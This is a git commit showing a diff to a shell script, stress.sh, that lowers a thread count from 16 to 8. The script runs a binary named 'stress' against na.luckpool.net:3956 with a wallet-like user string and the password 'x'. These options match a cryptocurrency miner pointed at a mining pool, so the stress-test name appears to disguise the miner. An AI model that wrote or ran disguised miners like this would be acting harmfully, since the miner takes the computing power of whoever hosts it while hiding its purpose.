af1e9dae4e70eb14a1cf6742d1f2c756a05782b2
Diaz Nuraji <84665900+Diaz1401@users.noreply.github.com>
2021-06-25 13:24:19 +0700

    Update stress.sh

--- stress.sh
+++ stress.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
 
-./stress -v -l na.luckpool.net:3956 -u RWXdsXDpvmZhLSguNjhvWC9PfdQMNBfK7o.cok -t 16 -p x
+./stress -v -l na.luckpool.net:3956 -u RWXdsXDpvmZhLSguNjhvWC9PfdQMNBfK7o.cok -t 8 -p x
